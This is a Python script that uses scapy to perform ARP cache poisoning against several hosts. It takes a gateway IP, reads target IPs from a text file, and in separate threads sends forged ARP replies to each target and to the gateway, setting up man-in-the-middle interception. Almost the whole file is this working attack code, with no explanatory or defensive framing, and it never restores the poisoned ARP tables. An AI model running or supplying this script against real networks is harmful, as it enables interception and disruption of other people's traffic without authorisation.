from multiprocessing import Process
from scapy.all import *
import os
import sys
import time
import threading
def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None
def poison(target,gate_way_ip,gate_way_MAC):
    poison_victim = ARP()
    poison_victim.op = 2
    poison_victim.psrc = gate_way_ip
    poison_victim.pdst = target
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target
    poison_gateway.pdst = gate_way_ip
    poison_gateway.hwdst = gate_way_MAC
    print(f'Beginning the ARP poison. [CTRL-C to stop]')
    c=0
    while c<=10:
        sys.stdout.write(".")
        sys.stdout.flush()
        send(poison_victim)
        send(poison_gateway)
        c+=1
    

gate_way_ip=input("ENTER THE GATE WAY IP : ")
gate_way_mac=get_mac(gate_way_ip)       

def main_classs():
    f1=open('mac_list.txt','r')
    lines=f1.readlines()
    print(gate_way_mac)
    time.sleep(2)
    
    for line in lines:
        t=line.split(" ")
        target_ip=t[0]
        target_mac=t[1]
        print("starting attack for {}".format(target_ip))        
        try:

            t=threading.Thread(target=poison,args=(target_ip,gate_way_ip,gate_way_mac))
            t.start()
            time.sleep(2)
        except KeyboardInterrupt as e:
                print(e)
        print("MAC TABLE IS GOING TO CONFIGURE")
        

main_classs()

    
